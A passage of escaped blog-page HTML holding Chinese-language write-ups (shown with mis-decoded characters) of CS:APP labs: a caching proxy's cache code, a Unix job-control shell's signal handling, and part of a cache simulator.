&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
}

void html_error(int fd, char *msg)
{
    char buf[MMAXLINE];

    sprintf(buf, &amp;quot;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Request Error&amp;lt;/title&amp;gt;&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;&amp;lt;body bgcolor=&amp;quot;
                 &amp;quot;ffffff&amp;quot;
                 &amp;quot;&amp;gt;
&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;%s
&amp;quot;, msg);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;&amp;lt;hr&amp;gt;&amp;lt;em&amp;gt;The Tiny Proxy server&amp;lt;/em&amp;gt;
&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
}

void init_cache()
{
    memset(cache.block_slot, 0, MAXCACHEBLOCK * sizeof(struct cache_block *));
    cache.clock_p = 0;
    cache.used_block = 0;
    cache.used_size = 0;
    read_cnt = 0;
    sem_init(&amp;amp;mutex, 0, 1);
    sem_init(&amp;amp;write_lock, 0, 1);
}

/*æ‰¾åˆ°è¿”å›body_sizeï¼Œå¹¶ä¸”å†™headerä¸bodyï¼Œæ‰¾ä¸åˆ°è¿”å›-1*/
int read_cache(char *header, char *body, char *real_path)
{
    P(&amp;amp;mutex);
    if (++read_cnt == 1)
        P(&amp;amp;write_lock);
    V(&amp;amp;mutex);

    int i, find = 0;
    for (i = 0; i &amp;lt; MAXCACHEBLOCK; i++)
    {
        if (cache.block_slot[i] != NULL &amp;amp;&amp;amp; !strcmp(cache.block_slot[i]-&amp;gt;path, real_path))
        {
            find = 1;
            break;
        }
    }

    if (find)
    {
        struct cache_block *block = cache.block_slot[i];
        sprintf(header, &amp;quot;%s&amp;quot;, block-&amp;gt;header);
        memcpy(body, block-&amp;gt;body, block-&amp;gt;body_size);
        block-&amp;gt;visit = 1;
        find = block-&amp;gt;body_size;
    }
    else
        find = -1;

    P(&amp;amp;mutex);
    if (--read_cnt == 0)
        V(&amp;amp;write_lock);
    V(&amp;amp;mutex);

    return find;
}

/*æˆåŠŸè¿”å›1ï¼Œå¤±è´¥è¿”å›0*/
int write_cache(char *header, char *body, int body_size, char *real_path)
{
    P(&amp;amp;write_lock);

    int slot;
    struct cache_block *block;

    slot = next_slot(body_size);
    block = cache.block_slot[slot] = (struct cache_block *)malloc(sizeof(struct cache_block));

    sprintf((block-&amp;gt;path), &amp;quot;%s&amp;quot;, real_path);
    sprintf((block-&amp;gt;header), &amp;quot;%s&amp;quot;, header);
    block-&amp;gt;visit = 1;
    block-&amp;gt;body_size = body_size;
    cache.used_block++;
    cache.used_size += body_size;
    if ((block-&amp;gt;body = (char *)malloc(body_size)) == NULL)
    {
        V(&amp;amp;write_lock);
        return 0;
    }
    memcpy(block-&amp;gt;body, body, body_size);
    V(&amp;amp;write_lock);
    return 1;
}

/*writeå·²ç»è·å¾—äº†å†™é”ï¼Œæ‰€ä»¥next_slotä¸evictéƒ½ä¸ç”¨å†åŠ é”*/
int next_slot(int need_size)
{
    while (cache.used_size + need_size &amp;gt; MAX_CACHE_SIZE || cache.used_block &amp;gt;= MAXCACHEBLOCK)
        evict();
    while (cache.block_slot[cache.clock_p] != NULL)
        cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
    return cache.clock_p;
}

void evict()
{
    struct cache_block *block;
    while (1)
    {
        block = cache.block_slot[cache.clock_p];
        if (block == NULL)
        {
            cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
            continue;
        }
        if (block-&amp;gt;visit)
        {
            block-&amp;gt;visit = 0;
        }
        else
        {
            free(block-&amp;gt;body);
            cache.used_size -= block-&amp;gt;body_size;
            cache.used_block--;
            free(block);
            cache.block_slot[cache.clock_p] = NULL;
            return;
        }

        cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æºæ–‡ä»¶&#34;&gt;æºæ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_proxylab.c&#34;&gt;proxy.c&lt;/a&gt;&lt;/p&gt;
">CSAPPï¼šproxylab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_mhapqg/"" data-c="
          &lt;p&gt;è¿™æ¬¡çš„å®éªŒè¦æ±‚æˆ‘ä»¬å®ç°ä¸€ä¸ªç®€åŒ–ç‰ˆçš„shellï¼Œéœ€è¦èƒ½å¤Ÿå®ç°å­ç¨‹åºçš„å‰å°ä¸åå°è¿è¡Œä»¥åŠåˆ‡æ¢ï¼ŒåŒæ—¶å®ç°å‡ æ¡å†…å»ºå‘½ä»¤ã€‚&lt;br&gt;
éœ€è¦æˆ‘ä»¬å®ç°çš„å†…å»ºå‘½ä»¤åŒ…æ‹¬ä»¥ä¸‹4ä¸ªï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;quitï¼š é€€å‡ºshell&lt;/li&gt;
&lt;li&gt;jobsï¼š æ‰“å°å­è¿›ç¨‹åˆ—è¡¨ä¸è¿è¡ŒçŠ¶æ€&lt;/li&gt;
&lt;li&gt;fgï¼š åˆ‡æ¢è¿›ç¨‹åˆ°å‰å°è¿è¡Œ&lt;/li&gt;
&lt;li&gt;bgï¼š åˆ‡æ¢è¿›ç¨‹åˆ°åå°è¿è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;eval&#34;&gt;&lt;code&gt;eval()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void eval(char *cmdline)
{
    char *argv[MAXARGS];
    char buf[MAXLINE];
    int bg;
    pid_t pid;
    sigset_t mask_one, mask_all, pre_mask;
    sigfillset(&amp;amp;mask_all);
    sigemptyset(&amp;amp;mask_one);
    sigaddset(&amp;amp;mask_one, SIGCHLD);
    strcpy(buf, cmdline);
    bg = parseline(buf, argv);
    if (argv[0] == NULL)
        return;
    if (!builtin_cmd(argv))
    {
        sigprocmask(SIG_BLOCK, &amp;amp;mask_one, &amp;amp;pre_mask);//é˜»æ–­SIGCHLD
        if ((pid = fork()) == 0)
        {
            setpgid(0, 0); //*******å¾ˆé‡è¦
            sigprocmask(SIG_SETMASK, &amp;amp;pre_mask, NULL);
            if (execve(argv[0], argv, environ) &amp;lt; 0)
            {
                printf(&amp;quot;%s: Command not found
&amp;quot;, argv[0]);
                exit(0);
            }
        }
        sigprocmask(SIG_BLOCK, &amp;amp;mask_all, NULL);//addjobæ¶‰åŠå…¨å±€å˜é‡è®¿é—®
        if (bg)
            addjob(jobs, pid, BG, buf);
        else
            addjob(jobs, pid, FG, buf);
        if (!bg)
            waitfg(pid);
        else
        {
            struct job_t *curr_bgmask = getjobpid(jobs, pid);
            printf(&amp;quot;[%d] (%d) %s&amp;quot;, curr_bgmask-&amp;gt;jid, curr_bgmask-&amp;gt;pid, curr_bgmask-&amp;gt;cmdline);
        }
        sigprocmask(SIG_SETMASK, &amp;amp;pre_mask, NULL);
    }
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªå‡½æ•°æœ¬èº«æ¯”è¾ƒç®€å•ï¼Œä¹¦ä¸Šçš„ä»£ç æ‹¿æ¥æ”¹æ”¹å°±èƒ½ç”¨ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ª&lt;strong&gt;ç‰¹åˆ«é‡è¦&lt;/strong&gt;çš„é—®é¢˜éœ€è¦æ³¨æ„&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_d39d0b88e903b260fa9be52bc967f7be.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¤§ä½“æ„æ€å°±æ˜¯åœ¨Unix shellä¸Šè¿è¡Œæˆ‘ä»¬è‡ªå·±çš„shellæ—¶ï¼Œéœ€è¦åœ¨åˆ›å»ºå‡ºä¸€ä¸ªå­è¿›ç¨‹ä¹‹åè°ƒç”¨&lt;code&gt;setpgid(0, 0)&lt;/code&gt; å°†ä»–ä»¬æ”¾åˆ°ä¸€ä¸ªæ–°çš„è¿›ç¨‹ç»„ï¼Œå¦åˆ™æˆ‘ä»¬çš„&lt;code&gt;ctrl-c&lt;/code&gt; ä¸&lt;code&gt;ctrl-z&lt;/code&gt; ä¼šæŠŠä¿¡å·å‘é€åˆ°åŒ…æ‹¬æˆ‘ä»¬çš„shellåœ¨å†…çš„å…¨éƒ¨è¿›ç¨‹ä¸­ï¼Œå°±æ˜¯å› ä¸ºæ²¡æ³¨æ„è¿™ä¸ªä½¿å¾—æˆ‘çš„shelläº§ç”Ÿçš„å¾ˆå¤šè¿·å¹»çš„é”™è¯¯ï¼Œä»¥è‡³äºè°ƒè¯•å¾ˆä¹…å´ä¸çŸ¥é“åŸå› ï¼ˆå…¶å®åªèƒ½æ€ªè‡ªå·±æ²¡è®¤çœŸçœ‹æ‰‹å†Œï¼‰ã€‚&lt;/p&gt;
&lt;h2 id=&#34;waitfg&#34;&gt;&lt;code&gt;waitfg()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;å¯¹äºwaitfg()å‡½æ•°ï¼Œæˆ‘æƒ³è¿‡å‡ ä¸ªå®è¡Œæ–¹æ¡ˆï¼š&lt;/p&gt;
&lt;h3 id=&#34;waitfg1&#34;&gt;&lt;code&gt;waitfg1()&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;# This is a buggy code.
void waitfg(pid_t pid)
{
    int status;
    if (waitpid(pid,&amp;amp;status,0) &amp;lt; 0)
        unix_error(&amp;quot;waitfg: waitpid error
&amp;quot;);
    printf(&amp;quot;wait %d ok
&amp;quot;,pid);
    return;
}

void sigchld_handler(int sig)
{
    pid_t pid;  
    int old_errno = errno;
    while ((pid = waitpid(-1, NULL, 0)) &amp;gt; 0) //è¿™é‡Œå¿…é¡»æ˜¯whileï¼Œä¹¦ä¸Šè®²çš„å¾ˆæ˜ç™½äº†
	    printf(&amp;quot;Handler reaped child %d
&amp;quot;, (int)pid);
    if (errno != ECHILD)
	    unix_error(&amp;quot;waitpid error&amp;quot;);
    errno = old_errno;
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»£ç æ˜¯ä¹‹å‰çš„ï¼Œçœç•¥äº†ä¸€äº›ä¸ç›¸å…³çš„ç»†èŠ‚ã€‚&lt;br&gt;
æˆ‘ä»¬ç›´æ¥åœ¨&lt;code&gt;waitfg&lt;/code&gt;é‡Œé¢è°ƒç”¨ &lt;code&gt;waitpid&lt;/code&gt; å‡½æ•°ï¼Œä½†æ˜¯è¿™æ ·åšæœ‰ä¸ªå¾ˆæ˜æ˜¾çš„é—®é¢˜ï¼Œå°±æ˜¯åœ¨å›æ”¶åå°è¿›ç¨‹æ—¶ï¼Œå¦‚æœåœ¨&lt;code&gt;sigchld_handler&lt;/code&gt; å‡½æ•°çš„æ‰§è¡Œé˜¶æ®µå‰å°è¿›ç¨‹ç»“æŸäº†ï¼Œä¼šè¢«ä¸€å¹¶å›æ”¶æ‰ï¼Œä»è€Œå¯¼è‡´&lt;code&gt;waitfg&lt;/code&gt; ä¸­çš„&lt;code&gt;waitpid&lt;/code&gt; å›æ”¶ä¸åˆ°å‰å°è¿›ç¨‹ï¼Œä»è€Œäº§ç”Ÿä¸€ä¸ªé”™è¯¯ã€‚&lt;/p&gt;
&lt;h3 id=&#34;waitfg2&#34;&gt;&lt;code&gt;waitfg2()&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;# This is a buggy code.
void waitfg(pid_t pid)
{
    int status;
    sigset_t mask_chld,pre_mask;
    sigemptyset(&amp;amp;mask_chld);
    sigaddset(&amp;amp;mask_chld,SIGCHLD);
    sigprocmask(SIG_SETMASK,&amp;amp;mask_chld,&amp;amp;pre_mask);
    if (waitpid(pid,&amp;amp;status,0) &amp;lt; 0)
        unix_error(&amp;quot;waitfg: waitpid error
&amp;quot;);
    printf(&amp;quot;wait %d ok
&amp;quot;,pid);
    sigprocmask(SIG_SETMASK,&amp;amp;pre_mask,NULL);
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åŠ å…¥æˆ‘ä»¬å†waitfgä¸­åŠ å…¥å¯¹SIGCHLDä¿¡å·çš„é˜»å¡ï¼Œè¿™æ ·å¯ä»¥ä¿è¯å‰å°è¿›ç¨‹èƒ½è¢«æ­£ç¡®å›æ”¶ï¼Œä½†æ˜¯é—®é¢˜åœ¨äºæˆ‘ä»¬æ‰§è¡Œå‰å°è¿›ç¨‹æ—¶ä¸ä¼šå¤„ç†SIGCHLDä¿¡å·ï¼Œè¿™æ ·å­è¿›ç¨‹å°±ä¸èƒ½è¢«å›æ”¶ï¼Œå¦‚æœå‰å°è¿›ç¨‹ä¸€ç›´è¿è¡Œï¼Œå°±ä¼šå¯¼è‡´åå°è¿›ç¨‹é€€å‡ºåå…¨éƒ¨å˜æˆåƒµæ­»è¿›ç¨‹ï¼Œæµªè´¹ç³»ç»Ÿèµ„æºã€‚&lt;br&gt;
æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆè¿˜æ˜¯è¦æŒ‰ç…§ä¹¦ä¸Šçš„æ€è·¯æ¥å®ç°&lt;/p&gt;
&lt;h3 id=&#34;waitfg-2&#34;&gt;&lt;code&gt;waitfg()&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void waitfg(pid_t pid)
{
    sigset_t mask_empty, mask_all, mask_pre;
    sigemptyset(&amp;amp;mask_empty);
    sigfillset(&amp;amp;mask_all);
    sigprocmask(SIG_SETMASK, &amp;amp;mask_all, &amp;amp;mask_pre); //fgpidæ¶‰åŠå…¨å±€å˜é‡çš„è®¿é—®
    while (pid == fgpid(jobs))
        sigsuspend(&amp;amp;mask_empty);
    sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sigchld_handler&#34;&gt;&lt;code&gt;sigchld_handler()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void sigchld_handler(int sig)
{
    pid_t pid;
    int status;
    int old_errno = errno;
    sigset_t mask_empty, mask_all, mask_pre;
    sigemptyset(&amp;amp;mask_empty);
    sigfillset(&amp;amp;mask_all);
    while ((pid = waitpid(-1, &amp;amp;status, WNOHANG | WUNTRACED)) &amp;gt; 0)
    {
        sigprocmask(SIG_BLOCK, &amp;amp;mask_all, &amp;amp;mask_pre);
        if (WIFSTOPPED(status)) //æš‚åœ
        {
            struct job_t *job = getjobpid(jobs, pid);
            job-&amp;gt;state = ST;
            printf(&amp;quot;Job [%d] (%d) stopped by signal %d
&amp;quot;,job-&amp;gt;jid, pid, WSTOPSIG(status));
        }
        else
        {
            if (WIFSIGNALED(status)) //è¢«ä¿¡å·é€€å‡º
            {
                struct job_t *job = getjobpid(jobs, pid);
                printf(&amp;quot;Job [%d] (%d) terminated by signal %d
&amp;quot;, job-&amp;gt;jid, job-&amp;gt;pid, WTERMSIG(status));
            } 
            deletejob(jobs, pid);
        }
        sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
    }
    errno = old_errno;
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ‰äº†å‰é¢çš„åŸºç¡€ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿå¾ˆç®€å•äº†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;sigint_handler-ä¸-sigtstp_handler&#34;&gt;&lt;code&gt;sigint_handler() ä¸ sigtstp_handler()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void sigint_handler(int sig)
{
    pid_t pid;
    int old_errno = errno;
    if ((pid = fgpid(jobs)) != 0)
    {
        kill(-pid, SIGINT);
    }
    errno = old_errno;
    return;
}

void sigtstp_handler(int sig)
{
    pid_t pid;
    int old_errno = errno;
    pid = fgpid(jobs);
    if (pid)
    {
        kill(-pid, sig);
    }
    errno = old_errno;
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸¤ä¸ªä¹Ÿå¾ˆç®€å•&lt;/p&gt;
&lt;h2 id=&#34;builtin_cmd&#34;&gt;&lt;code&gt;builtin_cmd()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int builtin_cmd(char **argv)
{
    if (!strcmp(argv[0], &amp;quot;quit&amp;quot;))
        exit(0);
    else if (!strcmp(argv[0], &amp;quot;jobs&amp;quot;))
    {
        listjobs(jobs);
        return 1;
    }
    else if (!strcmp(argv[0], &amp;quot;bg&amp;quot;) || !strcmp(argv[0], &amp;quot;fg&amp;quot;))
    {
        do_bgfg(argv);
        return 1;
    }
    return 0; /* not a builtin command */
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªå‡½æ•°ä¸ä¹¦ä¸Šçš„å‡ ä¹æ— å¼‚ã€‚&lt;/p&gt;
&lt;h2 id=&#34;do_bgfg&#34;&gt;&lt;code&gt;do_bgfg()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void do_bgfg(char **argv)
{
    struct job_t *job;
    if(argv[1] == NULL){
        printf(&amp;quot;%s command requires PID or %%jobid argument
&amp;quot;,argv[0]);
        return;
    }
    char * idstring = argv[1];
    int isjid = 0;
    int id;
    if(idstring[0]==&#39;%&#39;){   //ä»¥jobidä½œä¸ºç›®æ ‡
        isjid = 1;
        id = atoi(idstring+1);
        if(!id){
            printf(&amp;quot;%s: argument must be a PID or %%jobid
&amp;quot;,argv[0]);
            return;
        }
    }
    else{   //ä»¥pidä½œä¸ºç›®æ ‡
        id = atoi(idstring);
        if(!id){
            printf(&amp;quot;%s: argument must be a PID or %%jobid
&amp;quot;,argv[0]);
            return;
        }
    }
    sigset_t mask_empty, mask_all, mask_pre;
    sigemptyset(&amp;amp;mask_empty);
    sigfillset(&amp;amp;mask_all);
    sigprocmask(SIG_SETMASK, &amp;amp;mask_all, &amp;amp;mask_pre); //ä¸jobç›¸å…³æ“ä½œæ¶‰åŠå…¨å±€å˜é‡çš„è®¿é—®
    if (isjid)  //å¯»æ‰¾ç›®æ ‡job
    {
        job = getjobjid(jobs, id);
        if (!job){
            printf(&amp;quot;%%%d: No such job
&amp;quot;, id);
            sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
            return;
        }
    }
    else 
    {
        job = getjobpid(jobs, id);
        if (!job){
            printf(&amp;quot;(%d): No such process
&amp;quot;, id);
            sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
            return;
        }
    }
    pid_t pid = job-&amp;gt;pid;
    if (!strcmp(argv[0], &amp;quot;bg&amp;quot;)) //bg fgåˆ‡æ¢
    {
        job-&amp;gt;state = BG;
        printf(&amp;quot;[%d] (%d) %s&amp;quot;,job-&amp;gt;jid,job-&amp;gt;pid,job-&amp;gt;cmdline);
        kill(-pid, SIGCONT);
    }
    else if (!strcmp(argv[0], &amp;quot;fg&amp;quot;))
    {
        job-&amp;gt;state = FG;
        kill(-pid, SIGCONT);
        sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
        waitfg(pid);
        return;
    }
    sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸»è¦æ˜¯è¦å¯¹å‚æ•°æ˜¯å¦ç¬¦åˆè¦æ±‚è¿›è¡Œåˆ¤æ–­ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®Œæ•´ä»£ç &#34;&gt;å®Œæ•´ä»£ç &lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_shelllab.c&#34;&gt;tsh.c&lt;/a&gt;&lt;/p&gt;
">CSAPP: shelllab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_mezrog/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://csapp.cs.cmu.edu/3e/cachelab.pdf&#34;&gt;å®éªŒæ‰‹å†Œ&lt;/a&gt;ï¼šåŒ…å«äº†å®éªŒæŒ‡å¯¼å’Œè¯„åˆ†è§„åˆ™&lt;br&gt;
&lt;a href=&#34;http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf&#34;&gt;å®éªŒppt&lt;/a&gt;å¯¹ä¸Šè¯¾å†…å®¹çš„å›é¡¾å’Œå¯¹å®éªŒç»†èŠ‚çš„è®²è§£ï¼Œå¾ˆå€¼å¾—ä¸€çœ‹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;part-a&#34;&gt;Part A&lt;/h2&gt;
&lt;p&gt;è¿™ä¸€éƒ¨åˆ†æ˜¯è¦å®ç°ä¸€ä¸ªcacheæ¨¡æ‹Ÿå™¨ï¼Œéœ€è¦è®°å½•å‘½ä¸­æ¬¡æ•°ï¼Œä¸å‘½ä¸­æ¬¡æ•°å’Œæ›¿æ¢æ¬¡æ•°ï¼Œé€šè¿‡è¿™ä¸ªå¯ä»¥è®©æˆ‘ä»¬æ›´åŠ äº†è§£cacheçš„è¿è¡Œæ–¹å¼ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ›´åŠ äº†è§£LRUçš„æ›¿æ¢ç­–ç•¥ã€‚&lt;br&gt;
è¿™ä¸€éƒ¨åˆ†éœ€è¦äº†è§£çš„ä¸¤ä¸ªå‡½æ•°&lt;code&gt;getopt()&lt;/code&gt; å’Œ &lt;code&gt;fscanf()&lt;/code&gt; åœ¨å¼€å¤´çš„&lt;a href=&#34;http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf&#34;&gt;ppt&lt;/a&gt;ä¸­æœ‰è®²è§£ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å…ˆä¸Šä»£ç &#34;&gt;å…ˆä¸Šä»£ç &lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;quot;cachelab.h&amp;quot;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;getopt.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
int h, v, s, S, E, b, B;    //å®šä¹‰å…¨å±€å˜é‡æ–¹ä¾¿è°ƒç”¨
char t[200];
int hits, misses, evictions;
long stempnow = 0;
typedef struct
{
    int valid;  //æœ‰æ•ˆä½
    int tag;    //æ ‡è®°ä½
    long LRU_stemp; //LRUæ›¿æ¢çš„æ ‡è®°
} cacheline, *cache_set, **_cache;
_cache cache;

//è¿™ä¸€éƒ¨åˆ†æ˜¯ä¸ºäº†å®ç°-vä¸‹çš„å›æ˜¾ï¼Œæœ€ç»ˆçš„æµ‹è¯•å¹¶ä¸è¦æ±‚è¿™ä¸ª
typedef int result_tag;
#define MISS 0
#define HIT 1
#define EVICTION 2


void printUsage();  //-hæ‰“å°ä½¿ç”¨æ–¹æ³•
void init_cache();  //åˆå§‹åŒ–cache
void close_cache(); //freeæ‰cache
void printverbose(char oper, unsigned int address, int size, char *opresult);  //-vä¸‹æ‰“å°å›æ˜¾
void do_trace();  //è§£ætraceå¹¶ä»¥æ­¤æ‰§è¡Œ
result_tag access_cache(char oper, unsigned int address, int size); //è®¿é—®cache

int main(int argc, char **argv)
{

    int opt;
    while (-1 != (opt = (getopt(argc, argv, &amp;quot;hvs:E:b:t:&amp;quot;))))
    {
        switch (opt)
        {
        case &#39;h&#39;:
            h = 1;
            printUsage();
            break;
        case &#39;v&#39;:
            v = 1;
            break;
        case &#39;s&#39;:
            s = atoi(optarg);
            break;
        case &#39;E&#39;:
            E = atoi(optarg);
            break;
        case &#39;b&#39;:
            b = atoi(optarg);
            break;
        case &#39;t&#39;:
            strcpy(t, optarg);
            break;
        default:
            printUsage();
            break;
        }
    }
    if (s &amp;lt;= 0 || E &amp;lt;= 0 || b &amp;lt;= 0 || t == NULL) // å¦‚æœé€‰é¡¹å‚æ•°ä¸åˆæ ¼å°±é€€å‡º
        return -1;
    S = 1 &amp;lt;&amp;lt; s;
    B = 1 &amp;lt;&amp;lt; b;
    init_cache();
    do_trace();
    close_cache();
    printSummary(hits, misses, evictions);
    return 0;
}

void printUsage()
{
    printf(&amp;quot;Usage: ./csim-ref [-hv] -s &amp;lt;num&amp;gt; -E &amp;lt;num&amp;gt; -b &amp;lt;num&amp;gt; -t &amp;lt;file&amp;gt;
&amp;quot;
           &amp;quot;Options:
&amp;quot;
           &amp;quot;  -h         Print this help message.
&amp;quot;
           &amp;quot;  -v         Optional verbose flag.
&amp;quot;
           &amp;quot;  -s &amp;lt;num&amp;gt;   Number of set index bits.
&amp;quot;
           &amp;quot;  -E &amp;lt;num&amp;gt;   Number of lines per set.
&amp;quot;
           &amp;quot;  -b &amp;lt;num&amp;gt;   Number of block offset bits.
&amp;quot;
           &amp;quot;  -t &amp;lt;file&amp;gt;  Trace file.

&amp;quot;
           &amp;quot;Examples:
&amp;quot;
           &amp;quot;  linux&amp;gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace
&amp;quot;
           &amp;quot;  linux&amp;gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace
&amp;quot;);
}

void init_cache()
{
    cache = (_cache)malloc(sizeof(cache_set) * S);
    int i, j;
    for (i = 0; i &amp;lt; S; i++)
    {
        cache[i] = (cache_set)malloc(sizeof(cacheline) * E);
        for (j = 0; j &amp;lt; E; j++)
        {
            cache[i][j].tag = 0;
            cache[i][j].valid = 0;
            cache[i][j].LRU_stemp = 0;
        }
    }
}

void close_cache()
{
    int i;
    for (i = 0; i &amp;lt; S; i++)
        free(cache[i]);
    free(cache);
}

void printverbose(char oper, unsigned int address, int size, char *opresult)
{
    printf(&amp;quot;%c %x,%d %s
&amp;quot;, oper, address, size, opresult);
}

void do_trace()
{
    FILE *fp = fopen(t, &amp;quot;r&amp;quot;); // è¯»å–æ–‡ä»¶
    if (fp == NULL)
    {
        printf(&amp;quot;open error&amp;quot;);
        exit(-1);
    }

    char operation;       // å‘½ä»¤å¼€å¤´çš„ I L M S
    unsigned int address; // åœ°å€å‚æ•°
    int size;             // å¤§å°
    while (fscanf(fp, &amp;quot; %c %xu,%d
&amp;quot;, &amp;amp;operation, &amp;amp;address, &amp;amp;size) &amp;gt; 0)
    {
        size = 1;
        result_tag r;
        switch (operation)
        {
        case &#39;I&#39;:
            break;
        case &#39;L&#39;:
            r = access_cache(operation, address, size);
            if (v)
            {
                if (r == HIT)
                    printverbose(operation, address, size, &amp;quot;hit&amp;quot;);
                else if (r == MISS)
                    printverbose(operation, address, size, &amp;quot;miss&amp;quot;);
                else if (r == EVICTION)
                    printverbose(operation, address, size, &amp;quot;miss eviction&amp;quot;);
            }
            break;
        case &#39;S&#39;:
            r = access_cache(operation, address, size);
            if (v)
            {
                if (r == HIT)
                    printverbose(operation, address, size, &amp;quot;hit&amp;quot;);
                else if (r == MISS)
                    printverbose(operation, address, size, &amp;quot;miss&amp;quot;);
                else if (r == EVICTION)
                    printverbose(operation, address, size, &amp;quot;miss eviction&amp;quot;);
            }
            break;
        case &#39;M&#39;:
            r = access_cache(operation, address, size);
            hits++;         //Mçš„ç¬¬äºŒæ¬¡ä¸€å®šå‘½ä¸­
            if (v)
            {
                if (r == HIT)
                    printverbose(operation, address, size, &amp;quot;hit hit&amp;quot;);
                else if (r == MISS)
                    printverbose(operation, address, size, &amp;quot;miss hit&amp;quot;);
                else if (r == EVICTION)
                    printverbose(operation, address, size, &amp;quot;miss eviction hit&amp;quot;);
            }
            break;
        }
    }
    fclose(fp);
}

result_tag access_cache(char oper, unsigned int address, int size)
{
    int access_tag, access_set;
    int tag_mask, set_mask;
    set_mask = ((1 &amp;lt;&amp;lt; (b + s)) - 1) - ((1 &amp;lt;&amp;lt; b) - 1); //ç»„å·æ©ç 
    access_set = ((set_mask &amp;amp; address) &amp;gt;&amp;gt; b) % S;     //ç»„å·
    tag_mask = -1 &amp;lt;&amp;lt; (b + s);                //tagçš„æ©ç 
    access_tag = tag_mask &amp;amp; address;         //tagå€¼ 
    int i;
    for (i = 0; i &amp;lt; E; i++)
    {
        if (cache[access_set][i].valid &amp;amp;&amp;amp; cache[access_set][i].tag == access_tag) //å‘½ä¸­
        {
            hits++;
            cache[access_set][i].LRU_stemp = stempnow++;
            return HIT;
        }
    }

    for (i = 0; i &amp;lt; E; i++)
    {
        if (!cache[access_set][i].valid) //æœªå‘½ä¸­æ‰¾åˆ°ç©ºè¡Œ
        {
            cache[access_set][i].valid = 1;
            cache[access_set][i].tag = access_tag;
            cache[access_set][i].LRU_stemp = stempnow++;
            misses++;
            return MISS;
        }
    }

    //æœªå‘½ä¸­ä¸”éœ€è¦è¿›è¡Œè¡Œæ›¿æ¢
    //å¯»æ‰¾æ—¶é—´æˆ³æœ€å°ï¼ˆæœ€å°‘æœ€è¿‘ä½¿ç”¨ï¼‰çš„è¡Œ
    int eviction_line = 0;
    long maxstemp = ~((long)1 &amp;lt;&amp;lt; 63);
    for (i = 0; i &amp;lt; E; i++)
    {
        if (cache[access_set][i].LRU_stemp &amp;lt; maxstemp)
        {
            eviction_line = i;
